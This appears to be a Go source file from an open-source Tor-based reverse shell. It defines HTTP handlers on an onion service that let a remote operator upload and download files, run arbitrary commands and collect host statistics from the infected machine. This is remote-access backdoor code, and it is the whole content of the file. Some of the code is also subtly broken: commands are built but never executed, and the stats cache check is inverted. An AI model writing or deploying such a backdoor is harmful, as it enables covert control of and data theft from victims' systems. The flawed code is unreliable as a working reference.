package reverse_shell

import (
	"net/http"
	"os/exec"
	"time"

	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor"
	"github.com/mackerelio/go-osstat/cpu"
	"github.com/mackerelio/go-osstat/memory"
)

var startTime = time.Now()

type HttpHandleFunc = func(http.ResponseWriter, *http.Request)

type UploadPost struct {
	Path string `json:"path"`
	To   string `json:"to"`
}

func handleUpload(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		uploadPost := &UploadPost{}
		err := ParseJSONBody(r, uploadPost)
		if err != nil {
			ErrorBadRequest(w)
			return
		}
		c.UploadFile(uploadPost.Path, uploadPost.To)
	}
}

type DownloadPost struct {
	Path string `json:"path"`
	From string `json:"from"`
}

func handleDownload(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		downloadPost := &DownloadPost{}
		err := ParseJSONBody(r, downloadPost)
		if err != nil {
			ErrorBadRequest(w)
			return
		}
		c.DownloadFile(downloadPost.Path, downloadPost.From)
	}
}

type CommandPost struct {
	Executable string   `json:"executable"`
	Args       []string `json:"args"`
}

func handleCommand(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		command := &CommandPost{}
		err := ParseJSONBody(r, command)
		if err != nil {
			ErrorBadRequest(w)
			return
		}
		exec.Command(command.Executable, command.Args...)
	}
}

type StatGet struct {
	Onion    string  `json:"onion"`
	MemFree  uint64  `json:"mem_free"`
	MemUsed  uint64  `json:"mem_used"`
	MaxMem   uint64  `json:"max_mem"`
	Threads  int     `json:"threads"`
	CPUUsage float32 `json:"cpu_usage"`
	Uptime   int64   `json:"uptime"`
}

var cacheTTL = time.Second.Microseconds() * 5

func handleStats(c *tor.TorContext) HttpHandleFunc {
	cache := &StatGet{}
	age := time.Now()
	return func(w http.ResponseWriter, _ *http.Request) {
		if age.UnixMilli() < time.Now().UnixMilli()-cacheTTL {
			ErrorJSON(w, cache)
			return
		}
		stats := &StatGet{
			Onion:  c.Onion.Addr().String(),
			Uptime: time.Now().UnixMilli() - startTime.UnixMilli(),
		}
		memory, err := memory.Get()
		if err == nil {
			stats.MaxMem = memory.Total
			stats.MemFree = memory.Total - memory.Used
			stats.MemUsed = memory.Used
		}
		cpu, err := cpu.Get()
		if err == nil {
			stats.Threads = cpu.CPUCount
		}
		cache = stats
		age = time.Now()
		ErrorJSON(w, stats)
	}
}
